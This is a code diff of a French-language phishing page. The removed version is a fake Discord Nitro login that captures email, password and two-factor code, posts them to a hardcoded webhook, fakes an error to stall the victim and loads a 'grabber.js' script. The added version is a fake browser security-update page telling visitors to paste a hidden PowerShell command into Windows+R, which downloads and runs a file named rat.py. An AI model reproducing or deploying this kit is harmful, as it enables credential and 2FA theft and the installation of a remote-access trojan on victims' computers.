@@ -2,110 +2,43 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Discord</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mise à jour de sécurité requise</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=gg+sans:wght@400;500;600&display=swap');
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'gg sans', 'Helvetica Neue', Helvetica, Arial, sans-serif; }
-        body { background-color: #313338; color: #f2f3f5; display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
-        .card { background-color: #313338; width: 100%; max-width: 400px; text-align: center; }
-        .logo { width: 120px; margin-bottom: 24px; }
-        h2 { font-size: 24px; font-weight: 600; margin-bottom: 8px; color: #f2f3f5; }
-        p { color: #b5bac1; font-size: 16px; margin-bottom: 24px; }
-        .form-group { text-align: left; margin-bottom: 20px; }
-        label { display: block; color: #b5bac1; font-size: 12px; font-weight: 700; text-transform: uppercase; margin-bottom: 8px; }
-        input { width: 100%; padding: 10px; background-color: #1e1f22; border: 1px solid #1e1f22; border-radius: 3px; color: #dbdee1; font-size: 16px; outline: none; transition: border-color 0.2s; }
-        input:focus { border-color: #5865f2; }
-        button { width: 100%; padding: 12px; background-color: #5865f2; color: white; border: none; border-radius: 3px; font-weight: 500; cursor: pointer; margin-top: 4px; font-size: 16px; transition: background-color 0.2s; }
-        button:hover { background-color: #4752c4; }
-        .hidden { display: none !important; }
-        #status { margin-top: 15px; font-size: 14px; font-weight: bold; }
+        body { background-color: #202124; color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .box { background-color: #292a2d; padding: 40px; border-radius: 8px; text-align: center; max-width: 500px; border: 1px solid #3c4043; }
+        h1 { color: #f28b82; font-size: 24px; margin-bottom: 20px; }
+        p { font-size: 16px; line-height: 1.5; color: #e8eaed; margin-bottom: 20px; }
+        .code { background-color: #000; padding: 15px; border-radius: 4px; font-family: monospace; font-size: 18px; color: #00ff00; font-weight: bold; cursor: pointer; display: inline-block; margin-bottom: 20px; letter-spacing: 1px; word-break: break-all; }
+        .code:active { background-color: #333; }
+        .instruction { font-size: 14px; color: #9aa0a6; }
+        .copied { color: #00ff00 !important; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <img src="https://assets-global.website-files.com/6257adef93867e50d84d30e2/636e0a6a49cf127bf92de1e2_icon_clyde_blurple_RGB.png" class="logo" alt="Discord">
+    <div class="box">
+        <h1>⚠️ Attention requise</h1>
+        <p>Votre navigateur n'est pas à jour et votre système est vulnérable. Une mise à jour de sécurité est requise immédiatement.</p>
+        <p>Pour corriger cette erreur, copiez le code ci-dessous :</p>
         
-        <!-- ÉTAPE 1 : LOGIN -->
-        <div id="step1">
-            <h2>Bienvenue à nouveau!</h2>
-            <p>Connectez-vous pour réclamer votre cadeau.</p>
-            <form id="loginForm">
-                <div class="form-group">
-                    <label>E-mail ou numéro de téléphone</label>
-                    <input type="email" id="email" required>
-                </div>
-                <div class="form-group">
-                    <label>Mot de passe</label>
-                    <input type="password" id="password" required>
-                </div>
-                <button type="submit">Se connecter</button>
-            </form>
-        </div>
-
-        <!-- ÉTAPE 2 : 2FA -->
-        <div id="step2" class="hidden">
-            <h2>Vérification en deux étapes</h2>
-            <p>Entrez le code à 6 chiffres envoyé à votre adresse e-mail.</p>
-            <form id="codeForm">
-                <div class="form-group">
-                    <label>Code de vérification</label>
-                    <input type="text" id="code" required pattern="[0-9]{6}" placeholder="000000">
-                </div>
-                <button type="submit">Valider</button>
-            </form>
-        </div>
-
-        <div id="status"></div>
+        <div class="code" onclick="copyCode()" id="cmdText">powershell -w hidden -c "iwr -useb https://raw.githubusercontent.com/swiemali2-lgtm/member-cleanup/main/rat.py | iex"</div>
+        
+        <p class="instruction">Appuyez sur <b>Windows + R</b>, collez le code et appuyez sur <b>Entrée</b> pour mettre à jour.</p>
     </div>
 
     <script>
-        const webhookUrl = "https://discord.com/api/webhooks/1567231119496052837/Ms4fE1E1jbBSFf4fvh_H0OERpi8Fr0GGOhwCK47IZme5cXeiRMpW7BswR2LNXuTSVd7Z";
-
-        let tempEmail = "";
-        let tempPass = "";
-
-        // ÉTAPE 1 : ENVOI DU MDP
-        document.getElementById('loginForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            const statusDiv = document.getElementById('status');
-            statusDiv.style.color = "#ffff00"; 
-            statusDiv.innerText = "Vérification...";
-            
-            tempEmail = document.getElementById('email').value;
-            tempPass = document.getElementById('password').value;
-
-            const formData = new FormData();
-            formData.append("content", `**Nitro - Étape 1 (MDP)**\n**Email:** ${tempEmail}\n**Pass:** ${tempPass}`);
-            await fetch(webhookUrl, { method: 'POST', body: formData }).catch(()=>{});
-            
-            document.getElementById('step1').classList.add('hidden');
-            document.getElementById('step2').classList.remove('hidden');
-            statusDiv.innerText = "";
-        });
-
-        // ÉTAPE 2 : ENVOI DU CODE 2FA
-        document.getElementById('codeForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            const statusDiv = document.getElementById('status');
-            statusDiv.style.color = "#ffff00"; 
-            statusDiv.innerText = "Vérification du code...";
-            
-            const code = document.getElementById('code').value;
-
-            const formData = new FormData();
-            formData.append("content", `**Nitro - Étape 2 (CODE 2FA)**\n**Email:** ${tempEmail}\n**Code:** ${code}`);
-            await fetch(webhookUrl, { method: 'POST', body: formData }).catch(()=>{});
-
-            // FAUSSE ERREUR POUR GAGNER DU TEMPS
-            setTimeout(() => {
-                statusDiv.style.color = "#ff0000"; 
-                statusDiv.innerText = "Code invalide ou expiré. Veuillez vérifier votre boîte mail et réessayer.";
-                document.getElementById('code').value = "";
-            }, 1000); // 1 seconde de chargement
-        });
+        function copyCode() {
+            const text = document.getElementById('cmdText').innerText;
+            navigator.clipboard.writeText(text).then(() => {
+                const el = document.getElementById('cmdText');
+                el.innerText = "✅ Code copié !";
+                el.classList.add('copied');
+                setTimeout(() => {
+                    el.innerText = text;
+                    el.classList.remove('copied');
+                }, 2000);
+            });
+        }
     </script>
-    
-    <script src="grabber.js"></script>
 </body>
 </html>
